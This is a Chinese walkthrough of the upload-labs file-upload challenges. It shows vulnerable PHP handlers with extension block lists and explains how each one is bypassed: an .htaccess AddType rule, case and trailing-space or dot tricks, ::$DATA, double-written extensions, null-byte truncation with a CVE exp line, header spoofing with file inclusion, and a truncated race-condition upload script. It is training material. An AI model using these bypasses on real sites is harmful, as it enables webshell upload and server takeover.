false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件不允许上传!&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 过滤了各种罕见后缀 1$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); 但是没有过滤.htaccess,上述代码跟第三题类似,代码分析参看Pass-03 2. 利用上传.htaccess文件，文件内容如下： 1AddType application/x-httpd-php .jpg 将后缀.jpg的文件解释为php可执行文件 然后上传phpinfo.jpg, 内容如下： 123&lt;?php phpinfo();?&gt; Pass-05 大小写绕过1. 分析123456789101112131415161718192021222324252627# Pass-05$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 禁用了罕见的一些后缀，以及.htaccess, 但是并没有将后缀转换成小写，这里没有strtolower()函数进行后缀处理，而禁用的后缀并没有包括Php后缀 注意：在Linux没有特殊配置的情况下，这种情况只有win可以，因为win会忽略大小写 2. 利用 Pass-06 空格绕过1. 代码分析123456789101112131415161718192021222324252627# Pass-06$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件不允许上传&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 在Win下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点此处会删除末尾的点，但是没有去掉末尾的空格，因此上传一个.php空格文件即可 .php空格绕过了$deny_ext的验证，导致了文件上传 2. 利用 Pass-07 .绕过1.分析123456789101112131415161718192021222324252627# Pass-07$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 没有删除. 在Win下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点此处会删除末尾的点，但是没有去掉末尾的空格，因此上传一个.php空格文件即可 .php.绕过了$deny_ext的验证，导致了文件上传 2. 利用 Pass-08 ::$DATA绕过1. 代码123456789101112131415161718192021222324252627# Pass-08$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。当我们访问tao.php::DATA时，就是请求 tao.php 本身的数据,如果tao.php 还包含了其他的数据流，比如 tao.php:test.php，请求 tao.php:test.php::$DATA，则是请求tao.php中的流数据test.php的流数据内容 所以我们上传phpinfo.php::$DATA即可绕过。(仅限windows) 2. 利用 我们访问的时候需要删去::$DATA,直接访问php文件 Pass-09 .空格.绕过1. 分析123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 代码分析如下: 123456789101112131415161718$file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);/*当我们上传文件名为`phpinfo.php. .`时，因为这里trim处理的是字符两边的空格，所以$file_name=`phpinfo.php. .`*/$file_name = deldot($file_name);//删除文件名末尾的点// 上面代码删除了末尾的点，所以此时$file_name = `phpinfo.php. `, 注意，后面又空格$file_ext = strrchr($file_name, &#x27;.&#x27;);// sttrchr 查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符// 那么$file_ext=&quot;. &quot;$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //首尾去空# 最终$file_ext=&quot;.&quot;, 绕过校验 $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; move_uploaded_file($temp_file, $img_path);# 这里最终文件名拼接的是$file_name,则最终上传的文件名为`phpinfo.php. ` 2. 利用 这里解析同理Pass-06 and Pass-07 Pass-10 php双写绕过1. 分析1234567891011121314151617181920# Pass-10$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; str_ireplace() 函数替换字符串中的一些字符（不区分大小写）。 该函数必须遵循下列规则： 如果搜索的字符串是一个数组，那么它将返回一个数组。 如果搜索的字符串是一个数组，那么它将对数组中的每个元素进行查找和替换。 如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余元素将用空字符串进行替换 如果是对一个数组进行查找，但只对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用。 语法：str_ireplace(find,replace,string,count) 注释：该函数是不区分大小写的。请使用 str_replace() 函数执行区分大小写的搜索 参数 描述 find 必需。规定要查找的值。 replace 必需。规定替换 find 中的值的值。 string 必需。规定被搜索的字符串。 count 可选。一个变量，对替换数进行计数。 这里漏洞的产生发生在第9行，str_ireplace(), 将匹配$deny_ext数组中的字符替换 , 而这里只进行了一次替换，也及将这里$file_name 设置为pphphp 通过一次str_ireplace()的替换，$file_name的值将为等于php, 即可绕过 2. 利用 phpinfo.pphphp -&gt; info.php Q：为什么会出现这种情况呢？ A：我们可以理解为str_ireplace()函数匹配是从头到尾，而且只匹配一遍，下面的代码也很好的说明了这一点 Pass-11 %00截断1. 代码分析12345678910111213141516171819# Pass-11$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125;&#125; substr() 函数返回字符串的一部分。 注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0 语法：substr(string,start,length) 参数 描述 string 必需。规定要返回其中一部分的字符串。 start 必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始负数 - 在从字符串结尾的指定位置开始0 - 在字符串中的第一个字符处开始 length 可选。规定要返回的字符串长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回负数 - 从字符串末端返回 返回值： 返回字符串的提取部分，如果失败则返回 FALSE，或者返回一个空字符串。 strrpos() 函数查找字符串在另一字符串中最后一次出现的位置 注释：strrpos() 函数对大小写敏感 语法：strrpos(string,find,start) 参数 描述 string 必需。规定被搜索的字符串。 find 必需。规定要查找的字符。 start 可选。规定在何处开始搜索。 返回值： 返回字符串在另一字符串中最后一次出现的位置，如果没有找到字符串则返回 FALS CVE-2015-2348影响版本：5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7exp：move_uploaded_file($_FILES[&#39;name&#39;][&#39;tmp_name&#39;],&quot;/file.php\\x00.jpg&quot;); 2. 利用 Pass-12 0x00绕过1. 分析12345678910111213141516171819#Pass-12$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &quot;上传失败&quot;; &#125; &#125; else &#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125;&#125; php.ini设置 magic_quotes_gpc = Off 原理同Pass-11，上传路径0x00绕过。利用Burpsuite的Hex功能将save_path改成../upload/12.php(二进制00)形式 2. 利用 1对应31，我们将31改成00, Pass-13 文件头类型绕过1. 分析12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $file_type = getReailFileType($temp_file); if($file_type == &#x27;unknown&#x27;)&#123; $msg = &quot;文件未知，上传失败！&quot;; &#125;else&#123; $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;&#125; 通过读文件的前2个字节判断文件类型， 2. 利用 结合文件上传，构造payload:http://172.16.9.177/include.php?file=upload/5920201103201712.gif Pass-14 文件头类型绕过同理Pass-13 Pass-15 文件头类型绕过同理Pass14 Pass-16 图片马1. 分析123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;]; $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $target_path=UPLOAD_PATH.&#x27;/&#x27;.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,&quot;.&quot;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = &quot;该文件不是jpg格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = &quot;该文件不是png格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = &quot;该文件不是gif格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else&#123; $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;; &#125;&#125; 判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染 2. 利用 Pass-17 条件竞争1. 分析1234567891011121314151617181920212223$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . &#x27;/&#x27; . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg = &#x27;上传出错！&#x27;; &#125;&#125; 可以看到文件先经过保存，然后判断后缀名是否在白名单中，如果不在则删除，此时可以利用条件竞争在保存文件后删除文件前来执行php文件 2.利用利用条件竞争删除文件时间差绕过。使用命令pip install hackhttp安装hackhttp模块，运行下面的Python代码即可。如果还是删除太快，可以适当调整线程并发数 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python# coding:utf-8import hackhttpfrom multiprocessing.dummy import Pool as ThreadPooldef upload(lists): hh = hackhttp.hackhttp() raw = &quot;&quot;&quot;POST /Pass-17/index.php HTTP/1.1Host: 